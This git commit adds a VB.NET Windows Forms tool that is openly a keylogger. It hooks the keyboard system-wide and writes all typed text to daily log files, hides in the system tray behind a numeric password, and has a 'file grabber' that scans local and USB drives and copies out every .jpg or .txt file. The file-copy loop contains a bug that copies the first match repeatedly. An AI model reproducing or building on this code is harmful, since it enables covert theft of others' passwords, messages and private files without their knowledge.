106d8d58c05d59ca58e8d177e064a4f909188496
clevercoo1 <462960285@qq.com>
2017-06-03 22:28:43 +0800

    添加项目文件。

---
+++ Keyboard/Form1.Designer.vb
@@ -0,0 +1,248 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form 重写 Dispose，以清理组件列表。
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Windows 窗体设计器所必需的
+    Private components As System.ComponentModel.IContainer
+
+    '注意: 以下过程是 Windows 窗体设计器所必需的
+    '可以使用 Windows 窗体设计器修改它。  
+    '不要使用代码编辑器修改它。
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.Button_Start = New System.Windows.Forms.Button()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.Button3 = New System.Windows.Forms.Button()
+        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
+        Me.TextBox2 = New System.Windows.Forms.TextBox()
+        Me.Button4 = New System.Windows.Forms.Button()
+        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.ComboBox2 = New System.Windows.Forms.ComboBox()
+        Me.Button_search = New System.Windows.Forms.Button()
+        Me.ComboBox1 = New System.Windows.Forms.ComboBox()
+        Me.Buttin_ca = New System.Windows.Forms.Button()
+        Me.GroupBox1.SuspendLayout()
+        Me.GroupBox2.SuspendLayout()
+        Me.GroupBox3.SuspendLayout()
+        Me.SuspendLayout()
+        '
+        'Button_Start
+        '
+        Me.Button_Start.Location = New System.Drawing.Point(9, 21)
+        Me.Button_Start.Name = "Button_Start"
+        Me.Button_Start.Size = New System.Drawing.Size(75, 23)
+        Me.Button_Start.TabIndex = 0
+        Me.Button_Start.Text = "开始"
+        Me.Button_Start.UseVisualStyleBackColor = True
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(9, 62)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(75, 23)
+        Me.Button1.TabIndex = 1
+        Me.Button1.Text = "停止"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'Button2
+        '
+        Me.Button2.Location = New System.Drawing.Point(9, 104)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(75, 23)
+        Me.Button2.TabIndex = 2
+        Me.Button2.Text = "隐藏"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'NotifyIcon1
+        '
+        Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
+        Me.NotifyIcon1.Text = "NotifyIcon1"
+        Me.NotifyIcon1.Visible = True
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Location = New System.Drawing.Point(122, 26)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(41, 12)
+        Me.Label1.TabIndex = 3
+        Me.Label1.Text = "Label1"
+        '
+        'GroupBox1
+        '
+        Me.GroupBox1.Controls.Add(Me.Button2)
+        Me.GroupBox1.Controls.Add(Me.Label1)
+        Me.GroupBox1.Controls.Add(Me.Button1)
+        Me.GroupBox1.Controls.Add(Me.Button_Start)
+        Me.GroupBox1.Location = New System.Drawing.Point(1, 1)
+        Me.GroupBox1.Name = "GroupBox1"
+        Me.GroupBox1.Size = New System.Drawing.Size(274, 143)
+        Me.GroupBox1.TabIndex = 5
+        Me.GroupBox1.TabStop = False
+        Me.GroupBox1.Text = "键盘钩子"
+        '
+        'TextBox1
+        '
+        Me.TextBox1.Location = New System.Drawing.Point(6, 18)
+        Me.TextBox1.MaxLength = 6
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(80, 21)
+        Me.TextBox1.TabIndex = 6
+        '
+        'Button3
+        '
+        Me.Button3.Location = New System.Drawing.Point(95, 16)
+        Me.Button3.Name = "Button3"
+        Me.Button3.Size = New System.Drawing.Size(31, 23)
+        Me.Button3.TabIndex = 7
+        Me.Button3.Text = "√"
+        Me.Button3.UseVisualStyleBackColor = True
+        '
+        'GroupBox2
+        '
+        Me.GroupBox2.Controls.Add(Me.TextBox2)
+        Me.GroupBox2.Controls.Add(Me.Button4)
+        Me.GroupBox2.Controls.Add(Me.TextBox1)
+        Me.GroupBox2.Controls.Add(Me.Button3)
+        Me.GroupBox2.Location = New System.Drawing.Point(1, 146)
+        Me.GroupBox2.Name = "GroupBox2"
+        Me.GroupBox2.Size = New System.Drawing.Size(274, 45)
+        Me.GroupBox2.TabIndex = 8
+        Me.GroupBox2.TabStop = False
+        Me.GroupBox2.Text = "登录验证"
+        '
+        'TextBox2
+        '
+        Me.TextBox2.Location = New System.Drawing.Point(169, 18)
+        Me.TextBox2.Name = "TextBox2"
+        Me.TextBox2.Size = New System.Drawing.Size(80, 21)
+        Me.TextBox2.TabIndex = 9
+        '
+        'Button4
+        '
+        Me.Button4.Location = New System.Drawing.Point(132, 16)
+        Me.Button4.Name = "Button4"
+        Me.Button4.Size = New System.Drawing.Size(31, 23)
+        Me.Button4.TabIndex = 8
+        Me.Button4.Text = "?"
+        Me.Button4.UseVisualStyleBackColor = True
+        '
+        'GroupBox3
+        '
+        Me.GroupBox3.Controls.Add(Me.Label3)
+        Me.GroupBox3.Controls.Add(Me.ComboBox2)
+        Me.GroupBox3.Controls.Add(Me.Button_search)
+        Me.GroupBox3.Controls.Add(Me.ComboBox1)
+        Me.GroupBox3.Controls.Add(Me.Buttin_ca)
+        Me.GroupBox3.Location = New System.Drawing.Point(281, 1)
+        Me.GroupBox3.Name = "GroupBox3"
+        Me.GroupBox3.Size = New System.Drawing.Size(122, 191)
+        Me.GroupBox3.TabIndex = 9
+        Me.GroupBox3.TabStop = False
+        Me.GroupBox3.Text = "文件抓手"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Location = New System.Drawing.Point(75, 150)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(41, 12)
+        Me.Label3.TabIndex = 4
+        Me.Label3.Text = "Label3"
+        '
+        'ComboBox2
+        '
+        Me.ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
+        Me.ComboBox2.FormattingEnabled = True
+        Me.ComboBox2.Location = New System.Drawing.Point(16, 106)
+        Me.ComboBox2.Name = "ComboBox2"
+        Me.ComboBox2.Size = New System.Drawing.Size(80, 20)
+        Me.ComboBox2.TabIndex = 3
+        '
+        'Button_search
+        '
+        Me.Button_search.Location = New System.Drawing.Point(16, 62)
+        Me.Button_search.Name = "Button_search"
+        Me.Button_search.Size = New System.Drawing.Size(80, 23)
+        Me.Button_search.TabIndex = 2
+        Me.Button_search.Text = "扫描"
+        Me.Button_search.UseVisualStyleBackColor = True
+        '
+        'ComboBox1
+        '
+        Me.ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
+        Me.ComboBox1.FormattingEnabled = True
+        Me.ComboBox1.Location = New System.Drawing.Point(16, 26)
+        Me.ComboBox1.Name = "ComboBox1"
+        Me.ComboBox1.Size = New System.Drawing.Size(80, 20)
+        Me.ComboBox1.TabIndex = 1
+        '
+        'Buttin_ca
+        '
+        Me.Buttin_ca.Location = New System.Drawing.Point(16, 145)
+        Me.Buttin_ca.Name = "Buttin_ca"
+        Me.Buttin_ca.Size = New System.Drawing.Size(53, 23)
+        Me.Buttin_ca.TabIndex = 0
+        Me.Buttin_ca.Text = "抓取"
+        Me.Buttin_ca.UseVisualStyleBackColor = True
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 12.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(403, 192)
+        Me.Controls.Add(Me.GroupBox2)
+        Me.Controls.Add(Me.GroupBox1)
+        Me.Controls.Add(Me.GroupBox3)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.Name = "Form1"
+        Me.Text = "惊奇小工具 by_SST V1.0"
+        Me.GroupBox1.ResumeLayout(False)
+        Me.GroupBox1.PerformLayout()
+        Me.GroupBox2.ResumeLayout(False)
+        Me.GroupBox2.PerformLayout()
+        Me.GroupBox3.ResumeLayout(False)
+        Me.GroupBox3.PerformLayout()
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Friend WithEvents Button_Start As Button
+    Friend WithEvents Button1 As Button
+    Friend WithEvents Button2 As Button
+    Friend WithEvents NotifyIcon1 As NotifyIcon
+    Friend WithEvents Label1 As Label
+    Friend WithEvents GroupBox1 As GroupBox
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents Button3 As Button
+    Friend WithEvents GroupBox2 As GroupBox
+    Friend WithEvents GroupBox3 As GroupBox
+    Friend WithEvents Button4 As Button
+    Friend WithEvents TextBox2 As TextBox
+    Friend WithEvents Button_search As Button
+    Friend WithEvents ComboBox1 As ComboBox
+    Friend WithEvents Buttin_ca As Button
+    Friend WithEvents ComboBox2 As ComboBox
+    Friend WithEvents Label3 As Label
+End Class
---
+++ Keyboard/Form1.vb
@@ -0,0 +1,386 @@
+﻿Imports System.Text.RegularExpressions
+Imports System.IO
+Imports System.Text
+Imports System.Management
+Public Class Form1
+    Dim WithEvents MyHook As New SystemHook()
+    Dim today As String = System.DateTime.Now.ToString("yyyyMMdd")
+    Dim a As String
+    Dim SecureCode As Integer
+
+
+#Region "最小化到托盘"
+    '隐藏窗体，显示托盘NotifyIcon空间:NIcon
+    Sub HideMyForm()
+        Me.ShowInTaskbar = False
+        Me.NotifyIcon1.Visible = True
+        Me.Hide()
+    End Sub
+
+    '显示窗体
+    Sub ShowMyForm()
+        Me.Show()
+        Me.ShowInTaskbar = True
+        Me.WindowState = FormWindowState.Normal
+        '要在先设定Nicon的Visible为False，即最小化到托盘
+        Me.NotifyIcon1.Visible = False
+    End Sub
+    '窗体最小化时候隐藏窗体，
+    Private Sub MainForm_SizeChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.SizeChanged
+        If Me.WindowState = FormWindowState.Minimized Then
+            Me.Hide()
+            Me.ShowInTaskbar = False
+            Me.NotifyIcon1.Visible = True
+        End If
+    End Sub
+
+    '双击托盘，显示窗体
+    Private Sub NotifyIcon1_MouseClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseClick
+        GroupBox1.Visible = False
+        GroupBox3.Visible = False
+        GroupBox2.Visible = True
+        Me.ShowMyForm()
+    End Sub
+
+    '隐藏窗体按钮
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Me.HideMyForm()
+    End Sub
+
+#End Region
+
+#Region "抓图大师"
+    Public Function GetDeviceID() As List(Of String)
+        Dim deviceIDs As New List(Of String)
+        Dim query As New ManagementObjectSearcher("SELECT * From Win32_LogicalDisk")
+        Dim queryCollection As ManagementObjectCollection = query.Get()
+        For Each mo As ManagementObject In queryCollection
+            Dim nx As Integer = Int32.Parse(mo("DriveType").ToString())
+            Select Case nx
+                Case Int(DriveType.Removable)
+                    '可移动磁盘，U盘
+                    deviceIDs.Add(mo("DeviceID").ToString())
+                Case Int(DriveType.Fixed)
+                    '本地磁盘
+                    deviceIDs.Add(mo("DeviceID").ToString())
+                Case Int（DriveType.CDRom）
+                    'CD OR DVD
+                Case Int(DriveType.Network)
+                    '网络磁盘
+                Case Int（DriveType.Ram)
+                    '驱动器是RAM磁盘
+                Case Int（DriveType.NoRootDirectory)
+                    '磁盘没有根目录
+                Case Else
+                    MsgBox("驱动类型未知")
+            End Select
+        Next
+        Return deviceIDs
+    End Function
+
+    ''' <summary>
+    ''' 扫描按钮
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub Button_search_Click(sender As Object, e As EventArgs) Handles Button_search.Click
+        Me.ComboBox1.Items.Clear()
+        For Each xx As String In GetDeviceID()
+            Me.ComboBox1.Items.Add(xx)
+        Next
+    End Sub
+
+    ''' <summary>
+    ''' 获取文件列表
+    ''' </summary>
+    ''' <param name="info"></param>
+    ''' <param name="Ext"></param>
+    ''' <returns></returns>
+    Private Function ListFiles(info As FileSystemInfo, Ext As String, PicList As List(Of String)) As List(Of String)
+        If Not info.Exists Then
+            Return New List(Of String)
+        End If
+        Dim Dir As DirectoryInfo = New DirectoryInfo(info.ToString)
+        If Dir Is Nothing Then
+            Return New List(Of String)
+        End If
+        Try
+            Dim files As FileSystemInfo() = Dir.GetFileSystemInfos()
+            For i = 0 To files.Length - 1
+                Dim File As FileInfo = New FileInfo(files(i).FullName.ToString)
+                If (File IsNot Nothing AndAlso File.Extension.ToUpper() = "." + Ext.ToUpper()) Then
+                    PicList.Add(File.FullName)
+                Else
+                    ListFiles(New DirectoryInfo(files(i).FullName), Ext, PicList)
+                End If
+            Next
+
+            Return PicList
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
+        End Try
+    End Function
+
+    Private Sub GetFolderAndFile(path As String(), FilePath As List(Of String), FileName As String)
+        Try
+            If FilePath.Count > 1000 Then
+                Return
+            End If
+            For Each str As String In path
+                Dim nx As String() = Directory.GetDirectories(str)
+                Dim ff As String() = Directory.GetFiles(str, FileName)
+                For Each fi As String In ff
+                    FilePath.Add(fi)
+                Next
+                GetFolderAndFile(nx, FilePath, FileName)
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
+        End Try
+
+    End Sub
+
+
+
+    ''' <summary>
+    ''' 抓取文件
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub Buttin_ca_Click(sender As Object, e As EventArgs) Handles Buttin_ca.Click
+        'Dim PicList As New List(Of String)
+        'ListFiles(New DirectoryInfo("H:\\111"), ComboBox2.Text.Trim, PicList)
+        Dim cc As Int32 = 0
+
+
+        If ComboBox1.Text.Trim = "" Then
+            MsgBox("请选择盘符")
+            Return
+        End If
+
+        Dim miu As New List(Of String)
+        Dim one As String() = {ComboBox1.Text.Trim + "\\"}
+        Dim two As String = "*" + ComboBox2.Text.Trim
+
+        GetFolderAndFile(one, miu, two)
+        For i = 0 To miu.Count - 1
+            Dim na As String = WordChange(miu(i))
+            If Not File.Exists("D:\AmazingTools\pic\" + today + "\" + na) Then
+                File.Copy(miu(0), "D:\AmazingTools\pic\" + today + "\" + na)
+                cc += 1
+            End If
+        Next
+        If cc = 0 Then
+            Label3.BackColor = Color.Red
+        ElseIf cc > 0 Then
+            Label3.BackColor = Color.Green
+        Else
+            MsgBox("程序错误")
+        End If
+
+    End Sub
+
+
+    ''' <summary>
+    ''' 目标文件名处理
+    ''' </summary>
+    ''' <param name="xx"></param>
+    ''' <returns></returns>
+    Private Function WordChange(xx As String) As String
+        Dim result As String = ""
+        Dim count As Integer = 0
+        For i = 4 To xx.Length - 1
+            If xx(i) = "\" Then
+                count = i
+            End If
+        Next
+        result = xx.Substring(count + 1)
+        Return result
+    End Function
+#End Region
+
+
+#Region "键盘钩子"
+    ''' <summary>
+    ''' 主程序入口
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
+        initForm()
+        StartStatus(False)
+    End Sub
+
+    ''' <summary>
+    ''' 初始化页面
+    ''' </summary>
+    Private Sub initForm()
+        Label3.Text = " "
+        Label3.BackColor = Color.Red
+        Label1.Text = "空闲中..."
+        Label1.ForeColor = Color.Black
+        TextBox2.Visible = False
+        If Not System.IO.Directory.Exists("D:\AmazingTools\txt") Then
+            Directory.CreateDirectory("D:\AmazingTools\txt")
+        End If
+        If Not System.IO.Directory.Exists("D:\AmazingTools\pic") Then
+            Directory.CreateDirectory("D:\AmazingTools\pic")
+        End If
+        If Not System.IO.Directory.Exists("D:\AmazingTools\pic\" + today) Then
+            Directory.CreateDirectory("D:\AmazingTools\pic\" + today)
+        End If
+        Me.ComboBox1.Items.Clear()
+        For Each xx As String In GetDeviceID()
+            Me.ComboBox1.Items.Add(xx)
+        Next
+
+        Me.ComboBox2.Items.Clear()
+        Me.ComboBox2.Items.Add(".txt")
+        Me.ComboBox2.Items.Add(".jpg")
+        Me.ComboBox2.Text = ".jpg"
+    End Sub
+
+    ''' <summary>
+    ''' 定义初始状态
+    ''' </summary>
+    Private Sub StartStatus(x As Boolean)
+        GroupBox1.Visible = x
+        GroupBox3.Visible = x
+    End Sub
+
+    ''' <summary>
+    ''' 开始按钮
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub Button_Start_Click(sender As Object, e As EventArgs) Handles Button_Start.Click
+        Try
+            MyHook.StartHook(True, True)
+            If MyHook.KeyHookEnabled Then
+                Label1.Text = "启动键盘记录..."
+                Label1.ForeColor = Color.Red
+                a = ""
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
+        End Try
+    End Sub
+
+    ''' <summary>
+    ''' 关闭按钮
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Try
+            MyHook.UnHook()
+            Label1.Text = "停止键盘记录..."
+            Label1.ForeColor = Color.Blue
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
+        End Try
+    End Sub
+
+    Private Sub MyHook_KeyPress(sender As Object, e As KeyPressEventArgs) Handles MyHook.KeyPress
+        a += e.KeyChar.ToString
+    End Sub
+
+
+    ''' <summary>
+    ''' 密码确认
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        If TextBox1.Text.Trim = "" Then
+            Return
+        End If
+        If Not Regex.IsMatch(TextBox1.Text.Trim, "^[0-9]*$") Then
+            Return
+        End If
+        If TextBox1.Text.Trim = My.Settings.password Then
+            TextBox1.Text = ""
+            StartStatus(True)
+        End If
+    End Sub
+
+    ''' <summary>
+    ''' 密码修改
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
+        If TextBox2.Visible = True Then
+            Dim word As Integer = 0
+            If Not Regex.IsMatch(TextBox1.Text.Trim, "^[0-9]*$") OrElse String.IsNullOrEmpty(TextBox2.Text.Trim) Then
+                TextBox2.Text = ""
+                TextBox2.Visible = False
+                Return
+            Else
+                word = TextBox2.Text.Trim
+                My.Settings.password = word
+                MsgBox("修改成功")
+                TextBox2.Text = ""
+                TextBox2.Visible = False
+            End If
+        Else
+            If TextBox1.Text.Trim = "" Then
+                MsgBox("请在左边输入原密码")
+                Return
+            End If
+            If Not Regex.IsMatch(TextBox1.Text.Trim, "^[0-9]*$") Then
+                Return
+            End If
+            If TextBox1.Text.Trim = My.Settings.password Then
+                TextBox2.Visible = True
+                TextBox1.Text = ""
+            Else
+                MsgBox("原密码输入错误")
+                Return
+            End If
+        End If
+
+    End Sub
+
+
+    ''' <summary>
+    ''' 根据鼠标换行记录键盘输入
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
+    Private Sub MyHook_MouseActivity(sender As Object, e As MouseEventArgs) Handles MyHook.MouseActivity
+        Try
+            If Not e.Button = MouseButtons.Left Then
+                Return
+            End If
+
+            If Label1.Text = "启动键盘记录..." And Not String.IsNullOrEmpty(a) Then
+                Dim time As String = DateTime.Now.ToString("yyyy_MM_dd")
+                Dim name As String = "D:\AmazingTools\txt\" + time + ".txt"
+                Dim enc As Encoding = Encoding.GetEncoding("GB2312")
+                If Not File.Exists(name) Then
+                    Dim Writers As StreamWriter = File.CreateText(name)
+                    Writers.WriteLine(a)
+                    Writers.Close()
+                Else
+                    Dim fs As FileStream = File.OpenWrite(name)
+                    fs.Position = fs.Length
+                    Dim bytes As Byte() = enc.GetBytes(a & vbCrLf)
+                    fs.Write(bytes, 0, bytes.Length)
+                    fs.Close()
+                End If
+                a = ""
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
+        End Try
+
+    End Sub
+
+    'Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
+    '    Label3.BackColor = Color.Red
+    'End Sub
+
+
+#End Region
+End Class
